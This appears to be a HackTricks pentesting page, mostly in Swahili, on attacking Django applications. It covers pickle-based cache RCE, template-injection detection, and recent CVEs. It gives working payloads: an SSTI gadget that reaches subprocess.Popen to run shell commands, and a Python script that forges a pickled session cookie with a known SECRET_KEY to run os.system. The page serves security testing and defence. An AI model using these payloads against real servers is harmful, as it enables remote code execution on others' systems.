# Django

{{#include /src/banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Njia ya kuhifadhi cache ya Django ya kawaida ni [Python pickles](https://docs.python.org/3/library/pickle.html), ambayo inaweza kusababisha RCE ikiwa [ingizo lisiloaminika limeondolewa](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **Ikiwa mshambuliaji anaweza kupata ufikiaji wa kuandika kwenye cache, wanaweza kupeleka udhaifu huu hadi RCE kwenye seva ya msingi**.

Cache ya Django inahifadhiwa katika moja ya maeneo manne: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [kumbukumbu](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [faili](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), au [hifadhidata](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache iliyohifadhiwa kwenye seva ya Redis au hifadhidata ndiyo njia za shambulio zinazoweza kutokea (Redis injection na SQL injection), lakini mshambuliaji pia anaweza kutumia cache ya faili kubadilisha kuandika bila mpangilio kuwa RCE. Wajibu wameashiria hili kama si tatizo. Ni muhimu kutambua kwamba folda ya faili la cache, jina la jedwali la SQL, na maelezo ya seva ya Redis yatatofautiana kulingana na utekelezaji.

Ripoti hii ya HackerOne inatoa mfano mzuri, unaoweza kurudiwa wa kutumia cache ya Django iliyohifadhiwa kwenye hifadhidata ya SQLite: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
Lugha ya Kigezo ya Django (DTL) ni **Turing-complete**. Ikiwa data iliyotolewa na mtumiaji inatolewa kama *kigezo cha mfuatano* (kwa mfano kwa kuita `Template(user_input).render()` au wakati `|safe`/`format_html()` inatoa kuondoa kiotomatiki), mshambuliaji anaweza kufikia SSTI kamili → RCE.

### Detection
1. Tafuta simu za moja kwa moja kwa `Template()` / `Engine.from_string()` / `render_to_string()` ambazo zinajumuisha *data yoyote* ya ombi isiyo salama.
2. Tuma mzigo wa muda au wa hesabu:
```django
{{7*7}}
```
Ikiwa matokeo yaliyotolewa yana `49` ingizo linakusanywa na injini ya kigezo.

### Primitive to RCE
Django inazuia ufikiaji wa moja kwa moja kwa `__import__`, lakini grafu ya kitu cha Python inapatikana:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Pata index ya `subprocess.Popen` (≈400–500 kulingana na ujenzi wa Python) na tekeleza amri za kiholela:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
A safer universal gadget is to iterate until `cls.__name__ == 'Popen'`.

The same gadget works for **Debug Toolbar** or **Django-CMS** template rendering features that mishandle user input.

---

## Pickle-Backed Session Cookie RCE
Ikiwa mipangilio `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` imewezeshwa (au serializer maalum inayofanya deserialization ya pickle), Django *inafichua na kuondoa pickle* kwenye cookie ya kikao **kabla** ya kuita msimbo wowote wa mtazamo. Hivyo, kuwa na funguo halali za kusaini (mfunguo wa `SECRET_KEY` wa mradi kwa kawaida) inatosha kwa utekelezaji wa msimbo wa mbali mara moja.

### Mahitaji ya Kutekeleza
* Server inatumia `PickleSerializer`.
* Mshambuliaji anajua / anaweza kudhani `settings.SECRET_KEY` (kuvuja kupitia GitHub, `.env`, kurasa za makosa, nk.).

### Ushahidi wa Dhihirisho
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Tuma cookie inayofuata, na payload inafanya kazi kwa ruhusa za mfanyakazi wa WSGI.

**Mikakati ya Kuzuia**: Hifadhi `JSONSerializer` ya default, badilisha `SECRET_KEY`, na sanidi `SESSION_COOKIE_HTTPONLY`.

---

## CVEs za Juu za Django za Athari Kuu za Hivi Karibuni (2023-2025) Ambazo Pentesters Wanapaswa Kuangalia
* **CVE-2025-48432** – *Log Injection kupitia `request.path` isiyo na kukwepa* (imefanyiwa marekebisho Juni 4 2025). Inawawezesha washambuliaji kusafirisha newlines/ANSI codes kwenye faili za log na kuharibu uchambuzi wa log za chini. Kiwango cha patch ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Kuingilia kwa SQL muhimu* katika `QuerySet.values()/values_list()` kwenye `JSONField` (CVSS 9.8). Tengeneza funguo za JSON kuvunja kutoka kwa kunukuu na kutekeleza SQL isiyo na mipaka. Imefanyiwa marekebisho katika 4.2.15 / 5.0.8.

Daima tambua toleo halisi la mfumo kupitia ukurasa wa makosa wa `X-Frame-Options` au hash ya `/static/admin/css/base.css` na jaribu yaliyo hapo juu inapofaa.

---

## Marejeleo
* Toleo la usalama la Django – "Django 5.2.2, 5.1.10, 4.2.22 anashughulikia CVE-2025-48432" – 4 Juni 2025.
* OP-Innovate: "Django inatoa masasisho ya usalama kushughulikia kasoro ya kuingilia SQL CVE-2024-42005" – 11 Agosti 2024.

{{#include /src/banners/hacktricks-training.md}}
